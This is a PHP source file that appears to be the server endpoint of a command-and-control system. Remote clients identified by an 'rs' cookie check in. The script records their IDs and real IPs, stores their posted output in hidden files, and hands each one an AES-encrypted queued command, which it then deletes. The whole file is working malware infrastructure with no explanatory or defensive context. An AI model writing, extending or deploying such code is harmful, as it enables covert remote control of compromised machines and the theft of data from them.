<?php
	header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
	header("Cache-Control: post-check=0, pre-check=0", false);
	header("Pragma: no-cache");

	require_once __DIR__.'/config.php';

	if(file_exists(__DIR__.'/.nodes.json')) {
		$nodes = json_decode(file_get_contents(__DIR__.'/.nodes.json'), true);
	} else {
		$nodes = [];
	}

	if(preg_match('/^rs\=(.+)$/', $_SERVER['HTTP_COOKIE'], $arr)) {
		$nodes[$arr[1]] = [
			'lastseen' => time(),
			'ip' => $_SERVER['HTTP_CF_CONNECTING_IP']
		];

		file_put_contents(__DIR__.'/.nodes.json', json_encode($nodes));

		if(isset($_POST['a'])) {
			file_put_contents(__DIR__.'/.cr-'.md5($arr[1]), strtr(trim($_POST['a']), [' '=>'+']));
		}

		if(file_exists(__DIR__.'/.rs-'.md5($arr[1]))) {
			exec('cat '.escapeshellarg(__DIR__.'/.rs-'.md5($arr[1])).' | openssl enc -aes-128-cbc -base64 -A -salt -pass pass:'.escapeshellarg($passphrase), $a);
			echo implode('', $a);
			unlink(__DIR__.'/.rs-'.md5($arr[1]));
		}
	}
